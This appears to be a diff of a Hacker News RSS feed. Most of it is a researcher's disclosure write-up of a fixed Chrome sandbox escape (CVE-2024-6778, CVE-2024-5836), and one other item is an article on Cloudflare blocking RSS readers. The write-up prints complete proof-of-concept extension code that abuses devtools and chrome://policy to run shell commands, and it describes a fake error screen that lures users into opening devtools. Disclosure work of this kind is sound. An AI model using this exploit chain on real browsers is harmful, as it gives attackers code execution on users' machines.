+<div><pre><span></span><code><span>private</span><span> inspectedURLChanged</span><span>(</span><span>event</span><span>:</span><span> </span><span>Common.EventTarget.EventTargetEvent</span><span>&lt;</span><span>SDK</span><span>.</span><span>Target</span><span>.</span><span>Target</span><span>&gt;):</span><span> </span><span>void</span><span> </span><span>{</span>
+<span>  </span><span>if</span><span> </span><span>(!</span><span>ExtensionServer</span><span>.</span><span>canInspectURL</span><span>(</span><span>event</span><span>.</span><span>data</span><span>.</span><span>inspectedURL</span><span>()))</span><span> </span><span>{</span>
+<span>    </span><span>this</span><span>.</span><span>disableExtensions</span><span>();</span>
+<span>    </span><span>return</span><span>;</span>
+<span>  </span><span>}</span>
+<span>  </span><span>...</span>
+<span>}</span>
+</code></pre></div>
+
+<p>Importantly, it only takes the URL into consideration here, not the page's origin. As I demonstrated earlier, these can be two distinct things. Even if the URL is benign, the origin may not be.</p>
+<p>Abusing <code>about:blank</code> is nice and all but it's not very useful in the context of making an exploit chain. The page I want to get code execution on, <code>chrome://policy</code>, never opens any <code>about:blank</code> popups, so that's already a dead end. However, I noticed the fact that even though <code>inspectedWindow.eval()</code> failed, <code>inspectedWindow.reload()</code> still ran successfully and executed the JS on <code>chrome://settings</code>. This suggested that <code>inspectedWindow.eval()</code> has its own checks to see if the origin of the inspected page is allowed, while <code>inspectedWindow.reload()</code> has no checks of its own. </p>
+<p>Then I wondered if I could just spam the <code>inspectedWindow.reload()</code> calls, so that if at least one of those requests landed on the WebUI page, I would get code execution. </p>
+<div><pre><span></span><code><span>function</span><span> inject_script</span><span>()</span><span> </span><span>{</span>
+<span>  chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>reload</span><span>({</span><span>"injectedScript"</span><span>:</span><span> </span><span>`</span>
+<span>    //check the origin, this script won't do anything on a non chrome page</span>
+<span>    if (!origin.startsWith("chrome://")) return;</span>
+<span>    alert("hello from chrome.devtools.inspectedWindow.reload");</span>
+<span>    `</span>
+<span>  </span><span>});</span>
+<span>}</span>
+
+<span>setInterval</span><span>(()</span><span> </span><span>=&gt;</span><span> </span><span>{</span>
+<span>  </span><span>for</span><span> </span><span>(</span><span>let</span><span> i</span><span>=</span><span>0</span><span>;</span><span> i</span><span>&lt;</span><span>5</span><span>;</span><span> i</span><span>++)</span><span> </span><span>{</span>
+<span>    inject_script</span><span>();</span><span> </span>
+<span>  </span><span>}</span>
+<span>},</span><span> </span><span>0</span><span>);</span><span>  </span>
+
+<span>chrome</span><span>.</span><span>tabs</span><span>.</span><span>update</span><span>(</span><span>chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>tabId</span><span>,</span><span> </span><span>{</span><span>url</span><span>:</span><span> </span><span>"chrome://policy"</span><span>});</span>
+</code></pre></div>
+
+<p><img alt="A screenshot of an alert() on chrome://policy." src="https://ading.dev/blog/assets/chrome_sandbox_escape/inspectedwindow_race.png"></p>
+<p>And that's the final piece of the exploit chain working. This race condition relies on the fact that the inspected page and the devtools page are different processes. When the navigation to the WebUI occurs in the inspected page, there is a small window of time before the devtools page realizes and disables the API. If <code>inspectedWindow.reload()</code> is called within this interval of time, the reload request will end up on the WebUI page.</p>
+<h2>Putting it All Together</h2>
+<p>Now that I had all of the steps of the exploit working, I began putting together the proof of concept code. To recap, this POC has to do the following:</p>
+<ol>
+<li>Use the race condition in <code>chrome.devtools.inspectedWindow.reload()</code> to execute a JS payload on <code>chrome://policy</code></li>
+<li>That payload calls <code>sendWithPromise("setLocalTestPolicies", policy)</code> to set custom user policies.</li>
+<li>The <code>BrowserSwitcherEnabled</code>, <code>BrowserSwitcherUrlList</code>, <code>AlternativeBrowserPath</code>, and <code>AlternativeBrowserParameters</code> are set, specifying <code>/bin/bash</code> as the "alternate browser."</li>
+<li>The browser switcher is triggered by a simple <code>window.open()</code> call, which executes a shell command.</li>
+</ol>
+<p>The final proof of concept exploit looked like this:</p>
+<div><pre><span></span><code><span>let</span><span> executable</span><span>,</span><span> flags</span><span>;</span>
+<span>if</span><span> </span><span>(</span><span>navigator</span><span>.</span><span>userAgent</span><span>.</span><span>includes</span><span>(</span><span>"Windows NT"</span><span>))</span><span> </span><span>{</span>
+<span>  executable </span><span>=</span><span> </span><span>"C:\\Windows\\System32\\cmd.exe"</span><span>;</span>
+<span>  flags </span><span>=</span><span> </span><span>[</span><span>"/C"</span><span>,</span><span> </span><span>"calc.exe &amp; rem ${url}"</span><span>];</span>
+<span>}</span>
+<span>else</span><span> </span><span>if</span><span> </span><span>(</span><span>navigator</span><span>.</span><span>userAgent</span><span>.</span><span>includes</span><span>(</span><span>"Linux"</span><span>))</span><span> </span><span>{</span>
+<span>  executable </span><span>=</span><span> </span><span>"/bin/bash"</span><span>;</span>
+<span>  flags </span><span>=</span><span> </span><span>[</span><span>"-c"</span><span>,</span><span> </span><span>"xcalc # ${url}"</span><span>];</span>
+<span>}</span>
+<span>else</span><span> </span><span>if</span><span> </span><span>(</span><span>navigator</span><span>.</span><span>userAgent</span><span>.</span><span>includes</span><span>(</span><span>"Mac OS"</span><span>))</span><span> </span><span>{</span>
+<span>  executable </span><span>=</span><span> </span><span>"/bin/bash"</span><span>;</span>
+<span>  flags </span><span>=</span><span> </span><span>[</span><span>"-c"</span><span>,</span><span> </span><span>"open -na Calculator # ${url}"</span><span>];</span>
+<span>}</span>
+
+<span>//function which injects the content script into the inspected page</span>
+<span>function</span><span> inject_script</span><span>()</span><span> </span><span>{</span>
+<span>  chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>reload</span><span>({</span><span>"injectedScript"</span><span>:</span><span> </span><span>`</span>
+<span>    (async () =&gt; {</span>
+<span>      //check the origin, this script won't do anything on a non chrome page</span>
+<span>      console.log(origin);</span>
+<span>      if (!origin.startsWith("chrome://")) return;</span>
+
+<span>      //import cr.js since we need sendWithPromise</span>
+<span>      let cr = await import('chrome://resources/js/cr.js');</span>
+
+<span>      //here are the policies we are going to set</span>
+<span>      let policy = JSON.stringify([</span>
+<span>        { //enable the browser switcher feature</span>
+<span>          name: "BrowserSwitcherEnabled",</span>
+<span>          value: true,</span>
+<span>          level: 1,</span>
+<span>          source: 1,</span>
+<span>          scope: 1</span>
+<span>        }, </span>
+<span>        { //set the browser switcher to trigger on example.com</span>
+<span>          name: "BrowserSwitcherUrlList",</span>
+<span>          value: ["example.com"],</span>
+<span>          level: 1,</span>
+<span>          source: 1,</span>
+<span>          scope: 1</span>
+<span>        }, </span>
+<span>        { //set the executable path to launch</span>
+<span>          name: "AlternativeBrowserPath",</span>
+<span>          value: </span><span>${</span><span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>executable</span><span>)}</span><span>,</span>
+<span>          level: 1,</span>
+<span>          source: 1,</span>
+<span>          scope: 1</span>
+<span>        }, </span>
+<span>        { //set the arguments for the executable</span>
+<span>          name: "AlternativeBrowserParameters",</span>
+<span>          value: </span><span>${</span><span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>flags</span><span>)}</span><span>,</span>
+<span>          level: 1,</span>
+<span>          source: 1,</span>
+<span>          scope: 1</span>
+<span>        }</span>
+<span>      ]);</span>
+
+<span>      //set the policies listed above</span>
+<span>      await cr.sendWithPromise("setLocalTestPolicies", policy, "");</span>
+
+<span>      setTimeout(() =&gt; {</span>
+<span>        //navigate to example.com, which will trigger the browser switcher</span>
+<span>        location.href = "https://example.com";</span>
+
+<span>        //open a new page so that there is still a tab remaining after this</span>
+<span>        open("about:blank");  </span>
+<span>      }, 100);</span>
+<span>    })()`</span>
+<span>  </span><span>});</span>
+<span>}</span>
+
+<span>//interval to keep trying to inject the content script</span>
+<span>//there's a tiny window of time in which the content script will be</span>
+<span>//injected into a protected page, so this needs to run frequently</span>
+<span>function</span><span> start_interval</span><span>()</span><span> </span><span>{</span>
+<span>  setInterval</span><span>(()</span><span> </span><span>=&gt;</span><span> </span><span>{</span>
+<span>    </span><span>//loop to increase our odds</span>
+<span>    </span><span>for</span><span> </span><span>(</span><span>let</span><span> i</span><span>=</span><span>0</span><span>;</span><span> i</span><span>&lt;</span><span>3</span><span>;</span><span> i</span><span>++)</span><span> </span><span>{</span>
+<span>      inject_script</span><span>();</span><span> </span>
+<span>    </span><span>}</span>
+<span>  </span><span>},</span><span> </span><span>0</span><span>);</span><span>  </span>
+<span>}</span>
+
+<span>async</span><span> </span><span>function</span><span> main</span><span>()</span><span> </span><span>{</span>
+<span>  </span><span>//start the interval to inject the content script</span>
+<span>  start_interval</span><span>();</span>
+
+<span>  </span><span>//navigate the inspected page to chrome://policy</span>
+<span>  </span><span>let</span><span> tab </span><span>=</span><span> </span><span>await</span><span> chrome</span><span>.</span><span>tabs</span><span>.</span><span>get</span><span>(</span><span>chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>tabId</span><span>);</span>
+<span>  </span><span>await</span><span> chrome</span><span>.</span><span>tabs</span><span>.</span><span>update</span><span>(</span><span>tab</span><span>.</span><span>id</span><span>,</span><span> </span><span>{</span><span>url</span><span>:</span><span> </span><span>"chrome://policy"</span><span>});</span>
+
+<span>  </span><span>//if this times out we need to retry or abort</span>
+<span>  </span><span>await</span><span> </span><span>new</span><span> </span><span>Promise</span><span>((</span><span>resolve</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span>setTimeout</span><span>(</span><span>resolve</span><span>,</span><span> </span><span>1000</span><span>)});</span>
+<span>  </span><span>let</span><span> new_tab </span><span>=</span><span> </span><span>await</span><span> chrome</span><span>.</span><span>tabs</span><span>.</span><span>get</span><span>(</span><span>tab</span><span>.</span><span>id</span><span>);</span>
+
+<span>  </span><span>//if we're on the policy page, the content script didn't get injected</span>
+<span>  </span><span>if</span><span> </span><span>(</span><span>new_tab</span><span>.</span><span>url</span><span>.</span><span>startsWith</span><span>(</span><span>"chrome://policy"</span><span>))</span><span> </span><span>{</span>
+<span>    </span><span>//navigate back to the original page</span>
+<span>    </span><span>await</span><span> chrome</span><span>.</span><span>tabs</span><span>.</span><span>update</span><span>(</span><span>tab</span><span>.</span><span>id</span><span>,</span><span> </span><span>{</span><span>url</span><span>:</span><span> tab</span><span>.</span><span>url</span><span>});</span>
+
+<span>    </span><span>//discarding and reloading the tab will close devtools</span>
+<span>    setTimeout</span><span>(()</span><span> </span><span>=&gt;</span><span> </span><span>{</span>
+<span>      chrome</span><span>.</span><span>tabs</span><span>.</span><span>discard</span><span>(</span><span>tab</span><span>.</span><span>id</span><span>);</span>
+<span>    </span><span>},</span><span> </span><span>100</span><span>)</span>
+<span>  </span><span>}</span>
+
+<span>  </span><span>//we're still on the original page, so reload the extension frame to retry</span>
+<span>  </span><span>else</span><span> </span><span>{</span>
+<span>    location</span><span>.</span><span>reload</span><span>();</span>
+<span>  </span><span>}</span>
+<span>}</span>
+
+<span>main</span><span>();</span>
+</code></pre></div>
+
+<p>And with that, I was ready to write the bug report. I finalized the script, wrote an explanation of the bug, tested it on multiple operating systems, and sent it in to Google. </p>
+<p>At this point however, there was still a glaring problem: The race condition with <code>.inspectedWindow.reload()</code> was not very reliable. I managed to tweak it so that it worked about 70% of the time, but that still wasn't enough. While the fact that it worked at all definitely made it a serious vulnerability regardless, the unreliability would have reduced the severity by quite a bit. So then I got to work trying to find a better way.</p>
+<h2>A Familiar Approach</h2>
+<p>Remember how I mentioned that in David Erceg's bug report, he utilized the fact that debugger requests persist after the tab crashes? I wondered if this exact method worked for <code>inspectedWindow.reload()</code> too, so I tested it. I also messed with the <code>debugger</code> statement, and it appeared that triggering the debugger twice in a row caused the tab to crash.</p>
+<p>So I got to work writing a new POC:</p>
+<div><pre><span></span><code><span>let</span><span> tab_id </span><span>=</span><span> chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>tabId</span><span>;</span>
+
+<span>//function which injects the content script into the inspected page</span>
+<span>function</span><span> inject_script</span><span>()</span><span> </span><span>{</span>
+<span>  chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>reload</span><span>({</span><span>"injectedScript"</span><span>:</span><span> </span><span>`</span>
+<span>    //check the origin, so that the debugger is triggered instead if we are not on a chrome page</span>
+<span>    if (!origin.startsWith("chrome://")) {</span>
+<span>      debugger;</span>
+<span>      return;</span>
+<span>    }</span>
+
+<span>    alert("hello from chrome.devtools.inspectedWindow.reload");`</span>
+<span>  </span><span>});</span>
+<span>}</span>
+
+<span>function</span><span> sleep</span><span>(</span><span>ms</span><span>)</span><span> </span><span>{</span>
+<span>  </span><span>return</span><span> </span><span>new</span><span> </span><span>Promise</span><span>((</span><span>resolve</span><span>)</span><span> </span><span>=&gt;</span><span> </span><span>{</span><span>setTimeout</span><span>(</span><span>resolve</span><span>,</span><span> ms</span><span>)})</span>
+<span>}</span>
+
+<span>async</span><span> </span><span>function</span><span> main</span><span>()</span><span> </span><span>{</span>
+<span>  </span><span>//we have to reset the tab's origin here so that we don't crash our own extension process</span>
+<span>  </span><span>//this navigates to example.org which changes the tab's origin</span>
+<span>  </span><span>await</span><span> chrome</span><span>.</span><span>tabs</span><span>.</span><span>update</span><span>(</span><span>tab_id</span><span>,</span><span> </span><span>{</span><span>url</span><span>:</span><span> </span><span>"https://example.org/"</span><span>});</span>
+<span>  </span><span>await</span><span> sleep</span><span>(</span><span>500</span><span>);</span>
+<span>  </span><span>//navigate to about:blank from within the example.org page which keeps the same origin</span>
+<span>  chrome</span><span>.</span><span>devtools</span><span>.</span><span>inspectedWindow</span><span>.</span><span>reload</span><span>({</span><span>"injectedScript"</span><span>:</span><span> </span><span>`</span>
+<span>      location.href = "about:blank";</span>
+<span>    `</span><span> </span>
+<span>  </span><span>})</span>
+<span>  </span><span>await</span><span> sleep</span><span>(</span><span>500</span><span>);</span>
+
+<span>  inject_script</span><span>();</span><span> </span><span>//pause the current tab</span>
+<span>  inject_script</span><span>();</span><span> </span><span>//calling this again crashes the tab and queues up our javascript</span>
+<span>  </span><span>await</span><span> sleep</span><span>(</span><span>500</span><span>);</span>
+<span>  chrome</span><span>.</span><span>tabs</span><span>.</span><span>update</span><span>(</span><span>tab_id</span><span>,</span><span> </span><span>{</span><span>url</span><span>:</span><span> </span><span>"chrome://settings"</span><span>});</span>
+<span>}</span>
+
+<span>main</span><span>();</span>
+</code></pre></div>
+
+<video controls="">
+  <source src="https://ading.dev/blog/assets/chrome_sandbox_escape/devtools_api_vuln.mp4" type="video/mp4">
+  <p>Video info: A demonstration of the method that involves crashing the inspected page.</p>
+</video>
+
+<p>And it works! This nice part about this approach is that it eliminates the need for a race condition and makes the exploit 100% reliable. Then, I uploaded the new POC, with all of the <code>chrome://policy</code> stuff, to a comment on the bug report thread. </p>
+<p>But why would this exact oversight still exist even though it should have been patched 4 years ago? We can figure out why by looking at how that previous bug was patched. Google's fix was to <a href="https://chromium-review.googlesource.com/c/chromium/src/+/2587606">clear all the pending debugger requests</a> after the tab crashes, which seems like a sensible approach:</p>
+<div><pre><span></span><code><span>void</span><span> </span><span>DevToolsSession::ClearPendingMessages</span><span>(</span><span>bool</span><span> did_crash</span><span>)</span><span> </span><span>{</span>
+<span>  </span><span>for</span><span> </span><span>(</span><span>auto</span><span> it </span><span>=</span><span> pending_messages_</span><span>.</span><span>begin</span><span>();</span><span> it </span><span>!=</span><span> pending_messages_</span><span>.</span><span>end</span><span>();)</span><span> </span><span>{</span>
+<span>    </span><span>const</span><span> PendingMessage</span><span>&amp;</span><span> message </span><span>=</span><span> </span><span>*</span><span>it</span><span>;</span>
+<span>    </span><span>if</span><span> </span><span>(</span><span>SpanEquals</span><span>(</span><span>crdtp</span><span>::</span><span>SpanFrom</span><span>(</span><span>"Page.reload"</span><span>),</span>
+<span>                   crdtp</span><span>::</span><span>SpanFrom</span><span>(</span><span>message</span><span>.</span><span>method</span><span>)))</span><span> </span><span>{</span>
+<span>      </span><span>++</span><span>it</span><span>;</span>
+<span>      </span><span>continue</span><span>;</span>
+<span>    </span><span>}</span>
+<span>    </span><span>// Send error to the client and remove the message from pending.</span>
+<span>    std</span><span>::</span><span>string error_message </span><span>=</span>
+<span>        did_crash </span><span>?</span><span> kTargetCrashedMessage </span><span>:</span><span> kTargetClosedMessage</span><span>;</span>
+<span>    SendProtocolResponse</span><span>(</span>
+<span>        message</span><span>.</span><span>call_id</span><span>,</span>
+<span>        crdtp</span><span>::</span><span>CreateErrorResponse</span><span>(</span>
+<span>            message</span><span>.</span><span>call_id</span><span>,</span>
+<span>            crdtp</span><span>::</span><span>DispatchResponse</span><span>::</span><span>ServerError</span><span>(</span><span>error_message</span><span>)));</span>
+<span>    waiting_for_response_</span><span>.</span><span>erase</span><span>(</span><span>message</span><span>.</span><span>call_id</span><span>);</span>
+<span>    it </span><span>=</span><span> pending_messages_</span><span>.</span><span>erase</span><span>(</span><span>it</span><span>);</span>
+<span>  </span><span>}</span>
+<span>}</span>
+</code></pre></div>
+
+<p>You may notice that it seems to contain an exception for the <code>Page.reload</code> requests so that they are not cleared. Internally, the <code>inspectedWindow.reload()</code> API sends a <code>Page.reload</code> request, so as a result the <code>inspectedWindow.reload()</code> API calls are exempted from this patch. Google really patched this bug, then added an exception to it which made the bug possible again. I guess they didn't realize that <code>Page.reload</code> could also run scripts.</p>
+<p>Another mystery is why the page crashes when the <code>debugger</code> statement is run twice. I'm still not completely sure about this one, but I think I narrowed it down to a function within Chromium's renderer code. It's specifically happens when Chromium <a href="https://source.chromium.org/chromium/chromium/src/+/main:content/renderer/render_frame_impl.cc;l=1345-1346;drc=770f3fce3719ee18c102ad0b1a347d82147fbb1a">checks the navigation state</a>, and when it encounters an unexpected state, it crashes. This state gets messed up when <a href="https://source.chromium.org/chromium/chromium/src/+/main:content/renderer/render_frame_impl.cc;l=5622;drc=770f3fce3719ee18c102ad0b1a347d82147fbb1a?q=navigation_commit_state_&amp;ss=chromium%2Fchromium%2Fsrc">RenderFrameImpl::SynchronouslyCommitAboutBlankForBug778318</a> is called (yet another side effect of treating <code>about:blank</code> specially). Of course, any kind of crash works, such as with <code>[...new Array(2**31)]</code>, which causes the tab to run out of memory. However, the <code>debugger</code> crash is much faster to trigger so that's what I used in my final POC.</p>
+<p>Anyways, here's what the exploit looks like in action:</p>
+<video controls="">
+  <source src="https://ading.dev/blog/assets/chrome_sandbox_escape/sandbox_escape_final.mp4" type="video/mp4">
+  <p>Video info: A demonstration of the final POC.</p>
+</video>
+
+<p>By the way, you might have noticed the "extension install error" screen that is shown. That's just to trick the user into opening devtools, which triggers the chain leading to the sandbox escape.</p>
+<h2>Google's Response</h2>
+<p>After I reported the vulnerability, Google quickly confirmed it and classified it as P1/S1, which means high priority and high severity. Over the next few weeks, the following fixes were implemented:</p>
+<ul>
+<li><a href="https://chromium-review.googlesource.com/c/chromium/src/+/5542082">Adding a <code>loaderId</code> argument to the <code>Page.reload</code> command</a> and <a href="https://chromium-review.googlesource.com/c/chromium/src/+/5625857">checking the <code>loaderID</code> on the renderer side</a>  - This ensures that the command is only valid for a single origin and won't work if the command reaches a privileged page unintentionally.</li>
+<li><a href="https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/5546062">Checking for the URL in the <code>inspectedWindow.reload()</code> function</a> - Now, this function isn't dependent on only the extension API revoking access.</li>
+<li><a href="https://chromium-review.googlesource.com/c/chromium/src/+/5679162">Checking if the test policies are enabled in the WebUI handler</a> - By adding a working check in the handler function, this prevents the test policies from being set entirely.</li>
+</ul>
+<p>Eventually, the vulnerability involving the race condition was assigned <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-5836">CVE-2024-5836</a>, with a CVSS severity score of 8.8 (High). The vulnerability involving crashing the inspected page was assigned <a href="https://nvd.nist.gov/vuln/detail/CVE-2024-6778">CVE-2024-6778</a>, also with a severity score of 8.8.</p>
+<p>Once everything was fixed and merged into the various release branches, the VRP panel reviewed the bug report and determined the reward. <strong>I received with $20,000 for finding this vulnerability!</strong></p>
+<p><img alt="A screenshot of the message which announced the reward amount" src="https://ading.dev/blog/assets/chrome_sandbox_escape/reward_annoucement.png"></p>
+<p><img alt="A screenshot of the message which gave the rationale for the reward" src="https://ading.dev/blog/assets/chrome_sandbox_escape/reward_rationale.png"></p>
+<h2>Timeline</h2>
+<ul>
+<li>April 16 - I discovered the test policies bug</li>
+<li>April 29 - I found the <code>inspectedWindow.reload()</code> bug involving the race condition</li>
+<li>May 1 - I sent the bug report to Google</li>
+<li>May 4 - Google classified it as P1/S1 </li>
+<li>May 5 - I found the bug involving crashing the inspected page, and updated my report </li>
+<li>May 6 - Google asked me to file separate bug reports for every part of the chain</li>
+<li>July 8 - The bug report is marked as fixed</li>
+<li>July 13 - The report is sent to the Chrome VRP panel to determine a reward</li>
+<li>July 17 - The VRP panel decided the reward amount to be $20,000</li>
+<li>October 15 - The entire bug report became public</li>
+</ul>
+<h2>Conclusion</h2>
+<p>I guess the main takeaway from all of this is that if you look in the right places, the simplest mistakes can be compound upon each other to result in a vulnerability with surprisingly high severity. You also can't trust that very old code will remain safe after many years, considering that the <code>inspectedWindow.reload</code> bug actually works as far back as Chrome v45. Additionally, it isn't a good idea to ship completely undocumented, incomplete, and insecure features to everyone, as was the case with the policy test page bug. Finally, when fixing a vulnerability, you should check to see if similar bugs are possible and try to fix those as well.</p>
+<p>You may find the original bug report here: <a href="https://issues.chromium.org/issues/40053357">crbug.com/40053357</a></p>
+<p>I've also put the POCs for each part of the vulnerability in <a href="https://github.com/ading2210/CVE-2024-6778-POC">a Github repo</a>.</p>
+
+
+        
+          <p><a href="https://ading.dev/blog/">&lt;- Back</a></p>
+        
+      </div></div>]]></description>
+        </item>
+        <item>
+            <title><![CDATA[WordPress retaliation impacts community (188 pts)]]></title>
             <link>https://lwn.net/SubscriberLink/993895/c0438e0ee9382c5f/</link>
             <guid>41866328</guid>
             <pubDate>Thu, 17 Oct 2024 04:06:51 GMT</pubDate>
@@ -373,7 +917,82 @@ perception may impact open source as a whole.</p>
             </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Show HN: Automated smooth Nth order derivatives of noisy data (105 pts)]]></title>
+            <title><![CDATA[Using Cloudflare on your website could be blocking RSS users (126 pts)]]></title>
+            <link>https://openrss.org/blog/using-cloudflare-on-your-website-could-be-blocking-rss-users</link>
+            <guid>41864632</guid>
+            <pubDate>Wed, 16 Oct 2024 22:46:37 GMT</pubDate>
+            <description><![CDATA[<p>URL: <a href="https://openrss.org/blog/using-cloudflare-on-your-website-could-be-blocking-rss-users">https://openrss.org/blog/using-cloudflare-on-your-website-could-be-blocking-rss-users</a>, See on <a href="https://news.ycombinator.com/item?id=41864632">Hacker News</a></p>
+<div id="readability-page-1" class="page"><div>
+                    <article>
+                        
+                        <header>
+                            <time datetime="2024-10-16T00:00:00.000Z">October 16, 2024</time>
+                        </header>
+                        <picture>
+<source srcset="https://openrss.org/media/cloudflare-headline-image-dark.png" media="(prefers-color-scheme: dark)">
+<img src="https://openrss.org/media/cloudflare-headline-image.png" alt="Image of Cloudflare logo of what looks like a sun setting on a horizon with the words Cloudflare underneath in a super bold, dark gray font">
+</picture>
+
+<p>Many users prefer to use an RSS feed reader to stay up to date with the content on the websites they visit. But if you've enabled Cloudflare on your website, you're likely blocking these RSS users from accessing your website content without realizing it.</p>
+<a id="the-cloudflare-features-that-block-rss-readers" href="#the-cloudflare-features-that-block-rss-readers"></a>
+<p>In Cloudflare's dashboard, you'll find <a href="https://developers.cloudflare.com/waf/tools/">tools</a> designed to block bot traffic to your website. Particularly, the Bot Fight Mode and block all "AI scrapers and crawlers" options below. When enabled, these features end up blocking users who access your website through RSS readers, even though RSS readers are legitimate and aren't malicious bots.</p>
+<figure>
+<img src="https://openrss.org/media/cloudflare-bot-security-dashboard-detection-configuration.png" alt="An image of the Bot Fight Mode and AI Scrapers and Crawlers configuration toggles on Cloudflare's Security dashboard">
+<figcaption>A screenshot of Cloudflare's Bot Fight Mode and block all "AI scrapers and crawlers" features that block RSS readers from accessing a website</figcaption>
+</figure>
+
+<a id="how-cloudflare-blocks-rss-readers-from-your-website" href="#how-cloudflare-blocks-rss-readers-from-your-website"></a>
+<p>When enabling the tools, Cloudflare will evaluate each visit to your website and determine whether the visit is from an AI scraper or "bot" based on a <a href="https://developers.cloudflare.com/bots/concepts/bot-score">score</a> , which ironically Cloudflare uses AI to generate.</p>
+<picture>
+<source srcset="https://openrss.org/media/rss-readers-blocked-by-cloudflare-dark.png" media="(prefers-color-scheme: dark)">
+<img src="https://openrss.org/media/rss-readers-blocked-by-cloudflare.png" alt="Image of an RSS reader blocked by Cloudflare">
+</picture>
+
+<p>Then, when a user's RSS reader attempts to read your website, Cloudflare presents it with a number of <a href="https://developers.cloudflare.com/waf/reference/cloudflare-challenges/">challenges</a> that the reader would never be able to fulfill.</p>
+<p>Here's an example of the Human Verification challenge that an RSS reader would be shown when it tries to visit your website. The challenge requires a human to solve and, because an RSS reader is not a human, it can never complete them.</p>
+<picture>
+<source srcset="https://openrss.org/media/cloudflare-human-verification-dark.png" media="(prefers-color-scheme: dark)">
+<img src="https://openrss.org/media/cloudflare-human-verification.png" alt="A screenshot of Cloudflare-enabled website presenting a human verification screen">
+</picture>
+
+<p>In other cases, Cloudflare will simply block the RSS reader from accessing your website without a reason.</p>
+<img src="https://openrss.org/media/cloudflare-block.png" alt="A screenshot of Cloudflare-enabled website presenting a human verification screen">
+
+<p>The only way to resolve when Cloudflare blocks an RSS reader from accessing your website is by contacting you directly and asking you to make a custom rule to unblock it. But Cloudflare shouldn't expect people to contact every owner of every Cloudflare website that blocks their RSS reader. And you shouldn't have to waste time logging into Cloudflare to add an exception every time they block an RSS reader, either.</p>
+<a id="unblock-rss-readers-while-still-using-cloudflare" href="#unblock-rss-readers-while-still-using-cloudflare"></a>
+<p>Even though Cloudflare blocks RSS readers from your website, you can whitelist RSS readers as a workaround. This would at least unblock RSS readers without having to turn off any security features that you may have already been enabled until Cloudflare better addresses the issue.</p>
+<p>First, find the user agent of any blocked RSS reader in Cloudflare's analytics dashboard. The&nbsp;<code>User-Agent</code>&nbsp;of most good RSS readers usually include the name of the reader, it's URL, or a word like "RSS" or "feed" that makes it obvious that it's an RSS reader.</p>
+<p>Once you've identified an RSS reader's user agent, you can&nbsp;<a href="https://developers.cloudflare.com/waf/custom-rules/use-cases/allow-traffic-from-ips-in-allowlist/">create a custom</a>&nbsp;rule that explicitly whitelists and allows all traffic by the reader's IP address or by it's user agent string. Note that user agents can be disguised, so it's often better to whitelist the reader's IP address instead of the user agent. If you'd like to whitelist Open RSS, please&nbsp;<a href="https://openrss.org/contact">contact us</a>&nbsp;for the required information.</p>
+<a id="cloudflare-needs-a-better-way-to-allow-rss-readers" href="#cloudflare-needs-a-better-way-to-allow-rss-readers"></a>
+<p>Cloudflare offers a bot verification program to which RSS readers owners can manually apply to avoid being blocked by websites, but this program isn't guaranteed to work and it suffers from quite a few problems.</p>
+<ul>
+<li><p><strong>The verification process is flimsy</strong> — They're using a <a href="https://docs.google.com/forms/d/e/1FAIpQLSdqYNuULEypMnp4i5pROSc-uP6x65Xub9svD27mb8JChA_-XA/viewform">Google form</a> for applications to the program. Then after applying, no notification is sent that they're working on it or even received the application successfully (we've tried <a href="https://openrss.org/issue/144#202406210145">applying twice</a>), with no progress updates or expected timeframe for completion.</p>
+</li>
+<li><p><strong>Verified RSS readers are still being blocked</strong> — There are reports that RSS readers Cloudflare has verified as "good bots" are still being blocked from websites. If Cloudflare has successfully approved an RSS reader as a "good bot", it shouldn't be blocked or still require website owners to add any custom exception rules.</p>
+</li>
+<li><p><strong>Unblocking RSS readers across multiple websites is cumbersome</strong> — Cloudflare's only resolution to unblocking RSS readers is for the owners of the readers to contact each website owner directly and ask for an exception to be made. While that may work for one-off cases, this is unreasonable for RSS readers that have to access thousands of different Cloudflare-enabled websites each day. It's also overwhelming for website owners to configure exceptions for each and every RSS reader.</p>
+</li>
+</ul>
+<p>To be clear, there's nothing wrong with using Cloudflare's security tools on your website to help deal with malicious AI bots, scrapers, and potential attacks. But Cloudflare needs to ensure that people who use RSS tools aren't blocked from accessing your website content, and make it easier to resolve when they are.</p>
+ 
+    <small>
+        <br>
+        <center>❤</center>
+        <em>
+            Open RSS is a registered 501(c)(3) nonprofit headquartered in the
+            District of Columbia, USA and funded only by voluntary donations of
+            its users. If you enjoy using Open RSS, we'd be so grateful if you'd
+            consider
+            <a href="https://openrss.org/donate">donating</a> to help us grow and
+            continue to provide you with a quality and reliable service.
+        </em>
+    </small>
+
+                    </article>
+                </div></div>]]></description>
+        </item>
+        <item>
+            <title><![CDATA[Show HN: Automated smooth Nth order derivatives of noisy data (109 pts)]]></title>
             <link>https://github.com/hugohadfield/kalmangrad</link>
             <guid>41863398</guid>
             <pubDate>Wed, 16 Oct 2024 20:17:46 GMT</pubDate>
@@ -704,7 +1323,7 @@ plt.show()"><pre><span>import</span> <span>numpy</span> <span>as</span> <span>np
 </article></div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[Should We Chat, Too? Security Analysis of WeChat's Mmtls Encryption Protocol (119 pts)]]></title>
+            <title><![CDATA[Should We Chat, Too? Security Analysis of WeChat's Mmtls Encryption Protocol (122 pts)]]></title>
             <link>https://citizenlab.ca/2024/10/should-we-chat-too-security-analysis-of-wechats-mmtls-encryption-protocol/</link>
             <guid>41863278</guid>
             <pubDate>Wed, 16 Oct 2024 20:06:58 GMT</pubDate>
@@ -1286,7 +1905,7 @@ new_secret, iv)<br>
 			 </div></div>]]></description>
         </item>
         <item>
-            <title><![CDATA[AI PCs Aren't Good at AI: The CPU Beats the NPU (368 pts)]]></title>
+            <title><![CDATA[AI PCs Aren't Good at AI: The CPU Beats the NPU (377 pts)]]></title>
